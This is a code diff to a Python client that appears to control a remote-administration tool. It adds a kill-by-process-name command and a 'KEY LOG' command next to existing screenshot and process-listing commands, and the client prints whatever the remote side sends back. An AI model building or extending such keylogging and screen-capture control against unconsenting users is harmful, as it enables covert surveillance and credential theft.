@@ -12,7 +12,9 @@ TAKE_SCREEN_SHOT = "TAKE SCREENSHOT"
 RUNNING_PROCESS ="CHECK RUNNING PROCESS"
 STOP_LISTING = "STOP LISTING"
 KILL_PROCESS_VIA_PID = "KILL PROCESS VIA PID"
-KILL_PROCESS_VIA_PID_V2 = "KILL PROCESS VIA PID V2"
+KILL_PROCESS_VIA_NAME = "KILL PROCESS VIA NAME"
+KEY_LOGGING ="KEY LOG"
+
 
 
 
@@ -63,16 +65,24 @@ def Execute():
             print(receiving_msg)
            
 
-        elif msg == KILL_PROCESS_VIA_PID_V2:                        
+        elif msg == KILL_PROCESS_VIA_NAME:                        
             receiving_msg = client.recv(1024).decode(FORMAT)
             print(receiving_msg)
-            pid = input()
-            client.send(pid.encode(FORMAT))
+            p_name = input()
+            client.send(p_name.encode(FORMAT))
 
 
             receiving_msg = client.recv(1024).decode(FORMAT)
             print(receiving_msg)
            
+        elif msg == KEY_LOGGING:
+            receiving_msg = client.recv(1024).decode(FORMAT)
+            print(receiving_msg)
+            receiving_msg = client.recv(1024).decode(FORMAT)
+            print(receiving_msg)
+            receiving_msg = client.recv(1024).decode(FORMAT)
+            print(receiving_msg)
+
         else:
             receiving_msg = client.recv(1024).decode(FORMAT)
             print(receiving_msg)
